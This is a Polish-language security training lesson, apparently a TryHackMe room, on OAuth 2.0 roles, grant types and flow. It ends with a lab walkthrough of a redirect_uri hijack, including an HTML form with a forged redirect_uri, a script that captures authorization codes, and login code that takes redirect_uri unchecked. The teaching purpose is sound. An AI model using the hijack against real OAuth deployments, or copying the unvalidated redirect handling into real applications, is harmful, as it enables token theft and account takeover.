
W nowoczesnych aplikacjach internetowych luki w zabezpieczeniach protokołu OAuth stanowią poważne i często ignorowane ryzyko; mówiąc o OAuth, mamy na myśli OAuth 2.0, powszechnie stosowaną platformę autoryzacji. Luki pojawiają się, gdy hakerzy wykorzystują słabości protokołu OAuth 2.0, który umożliwia…CSRF,XSS, wycieku danych i wykorzystania innych luk w zabezpieczeniach.

Cele edukacyjne

W tym pomieszczeniu zdobędziesz wszechstronne zrozumienie następujących kluczowych koncepcji:

- Podstawowe koncepcje protokołu OAuth 2.0 (typy uprawnień)  
    
- Przepływ OAuth 2.0
- Identyfikuj usługi OAuth
- Eksploatacja techniczna
- Ewolucja OAuth 2.1

Przed rozpoczęciem zajęć w pokoju zaleca się zapoznanie się z następującymi tematami:

- [Protokoły i serwery](https://tryhackme.com/room/protocolsandservers)
- [Jak działają strony internetowe](https://tryhackme.com/room/howwebsiteswork)

Zaczynajmy!

W tym zadaniu omówimy kluczowe koncepcje związane z OAuth, a w szczególności OAuth 2.0. Koncepcje te stanowią podstawę do zrozumienia, jak zbudowano framework OAuth 2.0. Jako pentester lub programista, zrozumienie tych koncepcji jest niezbędne do przeprowadzenia pentestu strony internetowej lub napisania kodu bez luk w zabezpieczeniach. Aby przybliżyć te koncepcje, wyjaśnimy je na przykładzie codziennej rutyny: korzystania z aplikacji mobilnej kawiarni do zamawiania i płacenia za kawę.![rozpryskiwanie kawy na ikonie OAuth](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1724169244381.png)

Właściciel zasobu

Właścicielem zasobu jest **osoba** lub **system** , który kontroluje określone dane i może autoryzować aplikację do dostępu do nich w jej imieniu. Ta koncepcja jest fundamentalna, ponieważ koncentruje się na zgodzie użytkownika i kontroli. Na przykład, jesteś właścicielem zasobu jako klient kawiarni. Możesz kontrolować informacje o swoim koncie i przyznać aplikacji mobilnej kawiarni uprawnienia dostępu do swoich danych.  

Klient  

Klientem może być  **aplikacja mobilna**  lub  **aplikacja internetowa po stronie serwera** .  Działa ona jako pośrednik, żądając dostępu do zasobów i wykonując działania zgodnie z zezwoleniem właściciela zasobu. Na przykład aplikacja internetowa kawiarni, której używasz do zamawiania i płacenia za kawę, jest klientem. Aby uzyskać dostęp do danych konta i informacji o płatnościach, wymagana jest Twoja autoryzacja.

Serwer autoryzacji

Serwer autoryzacji odpowiada za **wydawanie tokenów dostępu klientowi** po pomyślnym uwierzytelnieniu właściciela zasobu i uzyskaniu jego autoryzacji. Serwer autoryzacji odgrywa kluczową rolę w procesie OAuth, zapewniając, że klient otrzyma uprawnienia dopiero po prawidłowym uwierzytelnieniu i wyrażeniu zgody przez użytkownika. Na przykład, serwer autoryzacji to system zaplecza kawiarni, który obsługuje uwierzytelnianie i autoryzację. Weryfikuje on Twoje dane uwierzytelniające i przyznaje aplikacji internetowej uprawnienia dostępu do Twojego konta.  

Serwer zasobów

Serwer hostujący chronione zasoby może  **przyjmować i odpowiadać**  **na żądania dotyczące chronionych zasobów** za pomocą tokenów dostępu. Serwer ten zapewnia, że ​​tylko uwierzytelnieni i autoryzowani klienci mogą uzyskać dostęp do danych właściciela zasobu lub nimi manipulować. Na przykład serwer zasobów to baza danych kawiarni, która przechowuje informacje o koncie, historię zamówień i dane dotyczące płatności. Odpowiada na żądania z aplikacji internetowej, umożliwiając pobieranie i modyfikowanie danych.

Udzielenie autoryzacji

Klient używa danych uwierzytelniających reprezentujących autoryzację właściciela zasobu (uprawniającą do dostępu do chronionych zasobów) w celu uzyskania tokena dostępu. Podstawowe typy uprawnień to  `Authorization Code`,  `Implicit`,  `Resource Owner Password Credentials`i  `Client Credentials`. Na przykład, gdy po raz pierwszy logujesz się do aplikacji kawiarni, otrzymujesz autoryzację (poprzez podanie nazwy użytkownika i hasła). Aplikacja używa tej autoryzacji do uzyskania tokena dostępu z serwera autoryzacji. Omówimy to szczegółowo w następnym zadaniu.

Token dostępu

Dane uwierzytelniające, których klient może używać do uzyskiwania dostępu do chronionych zasobów w imieniu właściciela zasobu. Mają one ograniczony czas ważności i zakres. Tokeny dostępu są niezbędne do utrzymania bezpiecznej i chronionej komunikacji między klientem a serwerem zasobów bez konieczności wielokrotnego proszenia właściciela zasobu o dane uwierzytelniające. Na przykład, po zalogowaniu się do aplikacji kawiarni, otrzymuje ona token dostępu, który umożliwia aplikacji dostęp do Twojego konta w celu składania zamówień i dokonywania płatności bez konieczności ponownego logowania przez określony czas. ![ikona klucza przedstawiająca token dostępu](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1724169379373.png)

Odśwież token

Dane uwierzytelniające, których klient może użyć do uzyskania nowego tokena dostępu bez konieczności ponownego uwierzytelnienia właściciela zasobu. Tokeny odświeżania są zazwyczaj trwałe i umożliwiają utrzymanie sesji użytkownika bez częstych przerw w logowaniu. Na przykład, gdy Twój token dostępu wygaśnie, aplikacja internetowa użyje tokena odświeżania, aby uzyskać nowy token dostępu, dzięki czemu nie będziesz musiał się ponownie logować.

Przekieruj URI

URI, do którego serwer autoryzacji przekieruje użytkownika-agenta właściciela zasobu po udzieleniu lub odmowie autoryzacji. Sprawdza on, czy klient, dla którego zażądano odpowiedzi autoryzacyjnej, jest poprawny. Na przykład, po interakcji z aplikacją kawiarni i zalogowaniu się, nastąpi przekierowanie do serwera autoryzacji przez stronę aplikacji w aplikacji kawiarni, powszechnie znaną jako URI przekierowania, w celu potwierdzenia pomyślnego zalogowania.

Zakres

Zakresy to mechanizm ograniczający dostęp aplikacji do konta użytkownika. Pozwalają one klientowi określić wymagany poziom dostępu, a serwerowi autoryzacji poinformować użytkownika, jakich poziomów dostępu żąda aplikacja. Zakresy pomagają egzekwować `principle of least privilege`. Na przykład aplikacja kawiarni może żądać różnych zakresów, takich jak dostęp do historii zamówień i danych płatności. Jako właściciel zasobu możesz zobaczyć, do jakich informacji aplikacja żąda dostępu, oraz przyznać lub odmówić uprawnień.  

Parametr stanu  

Opcjonalny parametr utrzymuje stan między klientem a serwerem autoryzacji. Może pomóc **zapobiec**CSRFAtaki te polegają na zapewnieniu zgodności odpowiedzi z żądaniem klienta. Parametr stanu jest kluczowym elementem zabezpieczenia przepływu OAuth. Na przykład, gdy inicjujesz proces logowania, aplikacja kawiarni wysyła parametr stanu do serwera autoryzacji. Ten parametr pomaga upewnić się, że otrzymana odpowiedź jest powiązana z pierwotnym żądaniem, chroniąc przed niektórymi typami ataków.

Token i punkt końcowy autoryzacji

Punkt końcowy serwera autoryzacji to miejsce, w którym klient wymienia przyznanie autoryzacji (lub token odświeżania) na token dostępu. Natomiast punkt końcowy autoryzacji to miejsce, w którym właściciel zasobu jest uwierzytelniany i autoryzuje klienta do dostępu do chronionych zasobów.

Dzięki zapoznaniu się z tematem z łatwością zrozumiesz techniki wykorzystywania luk i związane z nimi luki w zabezpieczeniach w nadchodzących zadaniach.


OAuth 2.0 oferuje kilka typów uprawnień, dostosowanych do różnych scenariuszy i typów klientów. Definiują one sposób, w jaki aplikacja może uzyskać token dostępu, aby uzyskać dostęp do chronionych zasobów w imieniu właściciela zasobu. W tym zadaniu omówimy cztery podstawowe typy uprawnień OAuth 2.0.  

Przyznanie kodu autoryzacyjnego  

Przyznanie kodu autoryzacyjnego to najczęściej używany przepływ OAuth 2.0 przeznaczony dla aplikacji po stronie serwera (PHP, JAVA, .NET itp.). W tym przepływie **klient przekierowuje użytkownika do serwera autoryzacji, gdzie użytkownik uwierzytelnia się i udziela autoryzacji** . Serwer autoryzacji przekierowuje następnie użytkownika do klienta z **kodem autoryzacji** . Klient wymienia kod autoryzacji na token dostępu, żądając punktu końcowego tokena serwera autoryzacji. 

![Diagram sekwencji przyznawania kodu autoryzacyjnego](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1724169763540.png)  

Ten typ grantu charakteryzuje się zwiększonym bezpieczeństwem, ponieważ kod autoryzacyjny jest wymieniany na token dostępu między serwerami, co oznacza, że ​​token dostępu nie jest ujawniany agentowi użytkownika (np. przeglądarce), zmniejszając tym samym ryzyko wycieku tokena. Obsługuje on również odświeżanie tokenów w celu utrzymania długoterminowego dostępu bez konieczności ponownego uwierzytelniania użytkownika.

Dorozumiane udzielenie  

Uprawnienie niejawne jest przeznaczone głównie dla aplikacji mobilnych i internetowych, w których klienci nie mogą bezpiecznie przechowywać sekretów. **Bezpośrednio wydaje ono klientowi token dostępu, bez konieczności wymiany kodu autoryzacyjnego** . W tym przepływie klient przekierowuje użytkownika do serwera autoryzacji. Po uwierzytelnieniu użytkownika i udzieleniu autoryzacji, serwer autoryzacji zwraca **token dostępu we fragmencie adresu URL** . Pełny przepływ przedstawiono poniżej:

![Diagram sekwencji niejawnych uprawnień](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1724169868247.png)  

Ten typ autoryzacji jest uproszczony i odpowiedni dla klientów, którzy nie mogą bezpiecznie przechowywać sekretów klienta. Jest szybszy, ponieważ wymaga mniej kroków niż autoryzacja kodem. Jest jednak mniej bezpieczny, ponieważ token dostępu jest ujawniany użytkownikowi i może zostać zapisany w historii przeglądarki. **Nie obsługuje również tokenów odświeżania** .   

Właściciel zasobu Hasło Poświadczenia Przyznanie  

Udzielenie poświadczeń hasła właściciela zasobu jest używane, gdy klient cieszy się **dużym zaufaniem właściciela zasobu** , np. w przypadku aplikacji własnych. Klient pobiera bezpośrednio dane uwierzytelniające użytkownika (nazwę użytkownika i hasło) i wymienia je na token dostępu, jak pokazano poniżej: 

![Schemat sekwencji przyznawania uprawnień do hasła właściciela zasobu](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1724169940244.png)  

W tym przepływie użytkownik podaje swoje dane uwierzytelniające bezpośrednio klientowi. Klient następnie przesyła je do serwera autoryzacji, który weryfikuje dane uwierzytelniające i wydaje token dostępu. Ten typ autoryzacji jest bezpośredni i wymaga mniejszej liczby interakcji, dzięki czemu nadaje się do wysoce zaufanych aplikacji, w których użytkownik ma pewność, że podaje swoje dane uwierzytelniające. Jest on jednak mniej bezpieczny, ponieważ wymaga bezpośredniego udostępniania danych uwierzytelniających klientowi i nie nadaje się do aplikacji innych firm.

Przyznanie uprawnień klienta  

Przyznanie uprawnień klienta służy do interakcji między serwerami bez udziału użytkownika. Klient używa swoich uprawnień do uwierzytelnienia się na serwerze autoryzacji i uzyskania tokena dostępu. W tym schemacie klient uwierzytelnia się na serwerze autoryzacji za pomocą swoich danych uwierzytelniających (identyfikatora klienta i klucza tajnego), a serwer autoryzacji wydaje token dostępu bezpośrednio klientowi, jak pokazano poniżej: 

![Diagram sekwencji przyznawania uprawnień klienta](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1724170002373.png)  

Ten typ uprawnień nadaje się do usług zaplecza i komunikacji serwer-serwer, ponieważ nie wymaga danych uwierzytelniających użytkownika, co zmniejsza ryzyko bezpieczeństwa związane z ujawnieniem danych użytkownika.

Następne zadanie pokaże, jak działa przepływ OAuth w aplikacji internetowej.


Przepływ OAuth 2.0 rozpoczyna się, gdy użytkownik (Właściciel Zasobów) wchodzi w interakcję z aplikacją kliencką (Klient) i żąda dostępu do określonego zasobu. Klient przekierowuje użytkownika do serwera autoryzacji, gdzie jest on proszony o zalogowanie się i udzielenie dostępu. Jeśli użytkownik wyrazi zgodę, serwer autoryzacji wydaje kod autoryzacji, który klient może wymienić na token dostępu. Ten token dostępu umożliwia klientowi dostęp do serwera zasobów i pobranie żądanego zasobu w imieniu użytkownika.

![proces przepływu pracy OAuth odzwierciedlający wszystkie kroki](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1724170101231.png)  

Omówimy szczegółowo różne kroki procesu OAuth na podstawie tego samego `CoffeeShopApp`przykładu. 

Łączenie się z maszyną

Możesz uruchomić maszynę laboratoryjną, klikając `Start Lab Machine`przycisk dołączony do tego zadania, aby otworzyć maszynę wirtualną w trybie podzielonego ekranu. Odczekaj 1–2 minuty po pełnym uruchomieniu systemu, aby umożliwić prawidłowe uruchomienie skryptów automatycznych. 

Użyjemy dostosowanej wersji zestawu narzędzi Django OAuth dla dostawcy OAuth. Bardzo ważne jest, aby zrozumieć, że termin „dostawca OAuth” używany w kolejnych zadaniach oznacza zewnętrznego dostawcę OAuth, z którym chcemy się zintegrować/uwierzytelnić. Na przykład, w przypadku `Login with FactBook`, dostawcą OAuth jest FactBook. Co więcej, w tych zadaniach dostawca OAuth, `CoffeeShopApp`, pozostanie ten sam; jednak klienci (aplikacja, którą chcemy zintegrować) będą się zmieniać w każdym zadaniu.  

Możesz odwiedzić adres URL  [http://coffee.thm:8000/admin(otwiera się w nowej karcie)](http://coffee.thm:8000/admin) aby zobaczyć panel logowania dostawcy OAuth, który w całym pomieszczeniu będzie taki sam.   

![ekran logowania coffeeshopapp](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1722242469426.png)  

W tym pomieszczeniu będziemy używać następujących danych uwierzytelniających dla dostawcy OAuth:

- **Ofiara** :`victim:victim123`
- **Atakujący** :`attacker:tesla@123`

**Uwaga** : na tym etapie nie musisz się logować, ale później, w trakcie wykonywania tego zadania, możesz zalogować się przy użyciu dowolnych z powyższych danych logowania.  

Po zalogowaniu się do swojego dostawcy OAuth możesz zalogować się na dowolnej innej stronie internetowej tak samo, jak robisz to `Sign Up with Google`na X, Facebooku czy dowolnej innej stronie internetowej. 

Teraz odwiedź adres URL  [http://bistro.thm:8000(otwiera się w nowej karcie)](http://bistro.thm:8000/), którego użyjemy do zrozumienia przepływu pracy OAuth. Zrozumiemy ten przepływ pracy, biorąc pod uwagę osobę o imieniu Tom (możesz użyć dowolnych z powyższych danych logowania), która chce zalogować się do innej aplikacji internetowej za pomocą swojego `CoffeeShopApp`konta.  

Żądanie autoryzacji

Tom najpierw odwiedza adres URL bistro  [http://bistro.thm:8000/demo oauth(otwiera się w nowej karcie)](http://bistro.thm:8000/oauthdemo), gdzie chce się zalogować przez `CoffeeShopApp`. Klikając **„Zaloguj się przez OAuth”** , `CoffeeShopApp`musi najpierw uzyskać jego zgodę, więc aplikacja przekierowuje przeglądarkę Toma do serwera autoryzacji z żądaniem autoryzacji.

![Ekran logowania MHT Bistro](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1723534738309.png)  

Kliknij **Zaloguj się za pomocą OAuth** , a zostaniesz przekierowany do serwera autoryzacji z adresem URL   pokazanym poniżej:`http://coffee.thm:8000/accounts/login/?next=/o/authorize/%3Fclient_id%3Dzlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt%26response_type%3Dcode%26redirect_uri%3Dhttp%3A//bistro.thm%3A8000/oauthdemo/callback` 

![panel logowania dla dostawcy OAuth aplikacji CoffeeshopApp](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1723535001157.png)  

Strona internetowa bistro inicjuje ten proces, przekierowując Toma do serwera autoryzacji, podając w adresie URL następujące parametry:

- `response_type=code`:Oznacza to, że `CoffeeShopApp`oczekuje na kod autoryzacyjny w odpowiedzi.
- `state`:Token CSRF zapewniający, że żądanie i odpowiedź są częścią tej samej transakcji.
- `client_id`:Publiczny identyfikator aplikacji klienckiej, jednoznacznie identyfikujący `CoffeeShopApp`.
- `redirect_uri`: Adres URL, na który serwer autoryzacji wyśle ​​Tomowi po udzieleniu pozwolenia. Musi on być zgodny z jednym z wstępnie zarejestrowanych adresów URI przekierowania dla aplikacji klienckiej.
- `scope`:Określa poziom żądanego dostępu, np. przeglądanie zamówień na kawę.

Dzięki uwzględnieniu tych parametrów aplikacja Bistro gwarantuje, że serwer autoryzacji rozumie żądanie i wskazuje, dokąd ma następnie odesłać użytkownika. Oto kod Pythona, który przekierowuje użytkownika do serwera autoryzacji:

```python
def oauth_login(request):
    app = Application.objects.get(name="CoffeeApp")
    redirect_uri = request.GET.get("redirect_uri", "http://bistro.thm:8000/oauthdemo/callback")
    
    authorization_url = (
        f"http://coffee.thm:8000/o/authorize/?client_id={app.client_id}&response_type=code&redirect_uri={redirect_uri}"
    )
    return redirect(authorization_url)
        
```

Uwierzytelnianie i autoryzacja

Gdy Tom dotrze do serwera autoryzacji, zostanie poproszony o zalogowanie się przy użyciu swoich danych. Ten krok gwarantuje, że serwer będzie mógł zweryfikować jego tożsamość. Po pomyślnym zalogowaniu serwer autoryzacji pyta Toma, czy zgadza się na udzielenie aplikacji Bistro dostępu do swoich danych. Ten krok zgody jest kluczowy, ponieważ zapewnia Tomowi transparentność i kontrolę nad tym, które aplikacje mogą uzyskać dostęp do jego danych.

Proces ten zazwyczaj obejmuje:

- **Logowanie użytkownika** : Tom wpisuje swoją nazwę użytkownika i hasło na stronie logowania serwera autoryzacyjnego.
- **Monit o zgodę** : Po uwierzytelnieniu serwer autoryzacji wyświetla Tomowi ekran zgody, który szczegółowo opisuje, `CoffeeShopApp`do czego żąda dostępu (np. przeglądanie zamówień kawy). Tom musi następnie zdecydować, czy udzielić, czy odmówić tych uprawnień.

![ekran autoryzacji z prośbą o zgodę](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1721987396749.png)  

Ten dwuetapowy proces gwarantuje, że tożsamość Toma zostanie uwierzytelniona, a jego wyraźna zgoda zostanie uzyskana przed udzieleniem jakiegokolwiek dostępu, zapewniając bezpieczeństwo i kontrolę użytkownika nad danymi osobowymi.

Odpowiedź autoryzacyjna

Jeśli Tomek zgodzi się na udzielenie dostępu, serwer autoryzacji generuje **kod autoryzacji** (opisany w Zadaniu 4). Następnie serwer przekierowuje Tomka do witryny bistro, używając określonego parametru `redirect_uri`. Przekierowanie zawiera kod autoryzacji i parametr stanu oryginalnego, aby zapewnić integralność przepływu.

Serwer autoryzacji odpowiada następująco:

- `code`: `CoffeeShopApp`użyje kodu autoryzacyjnego w celu zażądania tokena dostępu.
- `state`:Token CSRF wysłany wcześniej `CoffeeShopApp`w celu sprawdzenia odpowiedzi.

Przykładowa odpowiedź autoryzacyjna będzie wyglądać następująco  `https://bistro.thm:8000/callback?code=AuthCode123456&state=xyzSecure123`:

Ten krok zapewnia bezpieczeństwo procesu autoryzacji i powiązanie odpowiedzi z pierwotnym żądaniem bistro. Kod autoryzacji to tymczasowy token, który zostanie użyty w następnym kroku do uzyskania tokena dostępu, umożliwiającego `CoffeeShopApp`dostęp do danych profilu Toma.

Żądanie tokena

Strona internetowa bistro wymienia kod autoryzacji na token dostępu, żądając od punktu końcowego serwera autoryzacji tokena za pomocą  żądania POST z następującymi parametrami:

- `grant_type`:typ używanego grantu; zwykle ustawia się go w `code`celu określenia kodu autoryzacji jako typu grantu.
- `code`:Kod autoryzacyjny otrzymany z serwera autoryzacyjnego.
- `redirect_uri`: Musi być zgodny z oryginalnym adresem URI przekierowania podanym w żądaniu autoryzacji.
- `client_id and client_secret`:Dane uwierzytelniające aplikację kliencką.

Używając powyższych parametrów, poniższy kod wyśle ​​żądanie tokena do `/o/token`punktu końcowego.

```python
token_url = "http://coffee.thm:8000/o/token/"
    client_id = Application.objects.get(name="CoffeeApp").client_id
    client_secret = Application.objects.get(name="CoffeeApp").client_secret
    redirect_uri = request.GET.get("redirect_uri", "http://bistro.thm:8000/oauthdemo/callback")
    
    data = {
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": redirect_uri,
        "client_id": client_id,
        "client_secret": client_secret,
    }
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': f'Basic {base64.b64encode(f"{client_id}:{client_secret}".encode()).decode()}',
    }
    
    response = requests.post(token_url, data=data, headers=headers)
    tokens = response.json()
        
```

Aplikacja bistro bezpiecznie wymienia kod autoryzacyjny na token dostępu, wysyłając to żądanie. Serwer autoryzacji zweryfikuje podane informacje, upewniając się, że żądanie jest prawidłowe i pochodzi od klienta żądającego kodu autoryzacji. Jeśli wszystko jest w porządku, serwer autoryzacji odpowie tokenem dostępu, umożliwiając witrynie bistro dostęp do danych profilu Toma.

Odpowiedź tokena

Serwer autoryzacji uwierzytelnia witrynę bistro i weryfikuje kod autoryzacji. Po pomyślnej weryfikacji serwer odpowiada, wysyłając kod `Access Token` i, opcjonalnie, kod `Refresh Token`.

Odpowiedź serwera autoryzacji obejmuje następujące elementy:

- `access_token`:Token, który będzie używany do dostępu do danych Toma.
- `token_type`: Typowo „Nosiciel”.
- `expires_in`:Czas ważności tokena dostępu (w sekundach).
- `refresh_token (optional)`:Token służący do uzyskiwania nowych tokenów dostępu bez konieczności ponownego logowania się użytkownika.

Dzięki tokenowi dostępu strona internetowa bistro może teraz uwierzytelniać żądania do serwera zasobów w celu uzyskania dostępu do danych profilu Toma. Opcjonalny token odświeżania może być użyty do żądania nowego tokenu dostępu po wygaśnięciu obecnego, zapewniając płynne działanie użytkownika, eliminując konieczność wielokrotnego logowania się Toma.

Strona internetowa bistro zakończyła proces autoryzacji OAuth 2.0 za pomocą tokena dostępu. Ten token to dane uwierzytelniające umożliwiające aplikacji dostęp do chronionych zasobów w imieniu Toma. Teraz strona internetowa bistro może wysyłać uwierzytelnione żądania do serwera zasobów w celu pobrania profilu Toma. Każde żądanie do serwera zasobów zawiera **token dostępu** w nagłówku autoryzacji, co gwarantuje, że serwer rozpoznaje i zezwala na dostęp.


Identyfikowanie użycia protokołu OAuth w aplikacji

![soczewka pokazująca, jak wykryć strukturę OAuth](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1724169604593.png)

Pierwszym sygnałem, że aplikacja korzysta z protokołu OAuth, jest często proces logowania. Poszukaj opcji umożliwiających użytkownikom logowanie się za pośrednictwem zewnętrznych dostawców usług, takich jak Google, Facebook i GitHub. Opcje te zazwyczaj przekierowują użytkowników na stronę autoryzacyjną dostawcy usługi, co wyraźnie sygnalizuje, że protokół OAuth jest używany.

Wykrywanie implementacji OAuth

Analizując ruch sieciowy podczas procesu logowania, zwróć uwagę naHTTPPrzekierowania. Implementacje OAuth zazwyczaj przekierowują przeglądarkę do adresu URL serwera autoryzacji. Ten adres URL często zawiera określone parametry zapytania, takie jak `response_type`, `client_id`, `redirect_uri`, `scope`i `state`. Parametry te wskazują na trwający przepływ OAuth. Na przykład adres URL może wyglądać tak:  

`https://dev.coffee.thm/authorize?response_type=code&client_id=AppClientID&redirect_uri=https://dev.coffee.thm/callback&scope=profile&state=xyzSecure123`

Identyfikacja struktury OAuth

Po potwierdzeniu, że używany jest protokół OAuth, kolejnym krokiem jest identyfikacja konkretnej struktury lub biblioteki wykorzystywanej przez aplikację. Może to zapewnić wgląd w potencjalne luki w zabezpieczeniach i odpowiednie oceny bezpieczeństwa. Oto kilka strategii identyfikacji struktury OAuth:

- **Nagłówki i odpowiedzi HTTP** : sprawdź nagłówki HTTP i treści odpowiedzi w celu znalezienia unikatowych identyfikatorów lub komentarzy odwołujących się do określonych bibliotek lub struktur OAuth.
- **Analiza kodu źródłowego** : Jeśli masz dostęp do kodu źródłowego aplikacji, wyszukaj określone słowa kluczowe i polecenia importu, które mogą ujawnić używany framework. Na przykład biblioteki takie jak `django-oauth-toolkit`, `oauthlib`, `spring-security-oauth`lub `passport`in `Node.js`mają unikalne cechy i konwencje nazewnictwa.
- **Punkty końcowe autoryzacji i tokenów** : Przeanalizuj punkty końcowe używane do uzyskiwania kodów autoryzacji i tokenów dostępu. Różne implementacje OAuth mogą mieć unikalne wzorce lub struktury punktów końcowych. Na przykład,  `Django OAuth Toolkit`zazwyczaj stosuje się do wzorca `/oauth/authorize/`i `/oauth/token/`, podczas gdy inne frameworki mogą wykorzystywać inne ścieżki.
- **Komunikaty o błędach** : Niestandardowe komunikaty o błędach i dane wyjściowe debugowania mogą nieumyślnie ujawnić stos technologii bazowych. Szczegółowe komunikaty o błędach mogą zawierać odniesienia do konkretnych bibliotek lub frameworków OAuth.


Tokeny odgrywają kluczową rolę w środowisku OAuth 2.0, działając jako klucze cyfrowe, które zapewniają dostęp do chronionych zasobów. Tokeny te są wydawane przez serwer autoryzacji i przekierowywane do aplikacji klienckiej na podstawie parametru `redirect_uri`. To przekierowanie jest kluczowe w przepływie OAuth, zapewniając bezpieczne przesyłanie tokenów do docelowego odbiorcy. Jeśli jednak adres `redirect_uri`nie jest odpowiednio zabezpieczony, atakujący mogą to wykorzystać do przejęcia tokenów.

Rola Redirect_URI

Parametr `redirect_uri`jest określany podczas procesu OAuth, aby wskazać miejsce, do którego serwer autoryzacji powinien wysłać token po autoryzacji. Ten URI musi być wstępnie zarejestrowany w ustawieniach aplikacji, aby zapobiec lukom w zabezpieczeniach związanym z otwartym przekierowaniem. Podczas procesu OAuth serwer sprawdza, czy podany URI `redirect_uri`jest zgodny z jednym z zarejestrowanych URI.

Wrażliwość

Niezabezpieczenie `redirect_uri`może prowadzić do poważnych problemów z bezpieczeństwem. Jeśli atakujący uzyskają kontrolę nad dowolną domeną lub URI wymienionym w `redirect_uri`, mogą manipulować przepływem w celu przechwycenia tokenów. Oto, jak można to wykorzystać:

- Rozważmy aplikację OAuth z następującymi zarejestrowanymi adresami URI przekierowania, jak pokazano poniżej:

![Panel aplikacji coffeeshopapp pokazujący redirect_uri](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1723542692246.png)

- **Strategia atakującego** : Jeśli atakujący przejmie kontrolę nad domeną `dev.bistro.thm`, może wykorzystać przepływ OAuth. Ustawiając ją `redirect_uri`na `http://dev.bistro.thm/callback`, serwer autoryzacji wyśle ​​token do tej kontrolowanej domeny.
- **Atak spreparowany:** Atakujący inicjuje przepływ OAuth i zapewnia, że `redirect_uri`​​punkty prowadzą do kontrolowanej przez niego domeny. Po autoryzacji aplikacji przez użytkownika, token jest wysyłany do `http://dev.bistro.thm/callback`. Atakujący może teraz przechwycić ten token i użyć go do uzyskania dostępu do chronionych zasobów.

Przygotowanie ładunku (perspektywa atakującego)

Przed rozpoczęciem ćwiczenia upewnij się, że wylogowałeś się z dostawcy OAuth jako ofiara, odwiedzając łącze[http://kawa.thm:8000/admin/wyloguj(otwiera się w nowej karcie)](http://coffee.thm:8000/admin/logout).

W tym ćwiczeniu zakładamy, że atakujący włamał się do domeny `dev.bistro.thm:8002`i może hostować dowolną stronę HTML na serwerze. Rozważmy Toma, ofiarę, której wyślemy link. Atakujący może utworzyć prostą stronę HTML ( `redirect_uri.html`) z następującym kodem:

```html
     <form action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="get">
            <input type="hidden" name="redirect_uri" value="http://dev.bistro.thm:8002/malicious_redirect.html">
            <input type="submit" value="Hijack OAuth">
        </form>
```

Ten formularz wysyła ukryty `redirect_uri`parametr z wartością `http://dev.bistro.thm:8002/malicious_redirect.html`i wysyła żądanie do [http://coffee.thm:8000/oauthdemo/oauth_login/.(otwiera się w nowej karcie)](http://coffee.thm:8000/oauthdemo/oauth_login/)  Następnie strona `malicious_redirect.html`przechwytuje kod autoryzacyjny z adresu URL, korzystając z następującego kodu:

```javascript
<script>
            // Extract the authorization code from the URL
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code');
            document.getElementById('auth_code').innerText = code;
            console.log("Intercepted Authorization Code:", code);
            // code to save the acquired code in database/file etc
        </script>
        
```

**Uwaga** : Ponieważ atakujący ma pełną kontrolę nad subdomeną, po przekierowaniu ofiary do domeny kontrolowanej przez atakującego, zapisze on dane uwierzytelniające w bazie danych/pliku itp. do późniejszego wykorzystania. Co więcej, przekierowanie z redirect_uri do oryginalnego adresu URL będzie tak szybkie, że ofiara nie zorientuje się, że jej kod autoryzacyjny został przejęty.

Atakujący może wysłać Tomowi link ( [http://dev.bistro.thm:8002/redirect_uri.html(otwiera się w nowej karcie)](http://dev.bistro.thm:8002/redirect_uri.html)) za pomocą taktyk socjotechnicznych lub ataku CSRF. Ofiara, nieświadoma złośliwych intencji, klika link, który prowadzi do adresu URL `dev.bistro.thm:8002/redirect_uri.html`. W załączonej maszynie wirtualnej otwórz [link .(otwiera się w nowej karcie)](http://dev.bistro.thm:8002/redirect_uri.html)w przeglądarce jako ofiara. Zobaczysz następujący ekran:

![logowanie przez OAuth ze złośliwym przekierowaniem](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1721893887281.png)

W załączonej maszynie wirtualnej, gdy ofiara kliknie przycisk „ **Zaloguj się przez OAuth** ”, formularz wywołuje [ link] `http://coffee.thm:8000/oauthdemo/oauth_login/`, ale z fałszywym [link] `redirect_uri`. Po wprowadzeniu przez ofiarę danych uwierzytelniających ( `victim:victim123`) dla dostawcy OAuth, kod autoryzacji OAuth jest kierowany na kontrolowany przez atakującego adres URL ( `http://dev.bistro.thm:8002/malicious_redirect.html`), umożliwiając atakującemu przechwycenie i niewłaściwe wykorzystanie kodu autoryzacji, jak pokazano poniżej:

![ekran pokazujący przechwycony kod](https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1721893960620.png)

Perspektywa atakującego

